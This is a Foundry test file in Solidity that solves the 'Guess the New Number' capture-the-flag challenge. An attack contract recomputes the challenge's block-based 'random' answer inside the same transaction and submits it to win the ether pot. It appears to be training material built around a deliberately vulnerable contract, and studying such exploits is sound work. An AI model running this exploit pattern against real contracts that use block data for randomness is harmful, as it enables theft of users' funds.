// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {GuessTheNewNumberChallenge} from "../../src/1-Lotteries/4-GuessTheNewNumber.sol";

contract GuessTheNewNumberTest is Test {
    address challengeAddress;

    function setUp() public {
        GuessTheNewNumberChallenge challenge = new GuessTheNewNumberChallenge{value: 1 ether}();
        challengeAddress = payable(address(challenge));
    }

    function testSolveGuessTheNewNumber() public {
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(payable(challengeAddress));

        // [START]

        GuessTheNewNumberAttack attacker = new GuessTheNewNumberAttack(address(challenge));
        vm.deal(address(attacker), 1 ether);
        attacker.attack();

        console.log("Attacker balance: ", address(attacker).balance);

        // [END]

        // assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}

interface IGuessNumber {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttack {
    IGuessNumber target;

    constructor(address _target) public {
        target = IGuessNumber(_target);
    }

    function attack() public payable {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        target.guess{value: 1 ether}(answer);

        require(target.isComplete(), "Target is not complete");
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
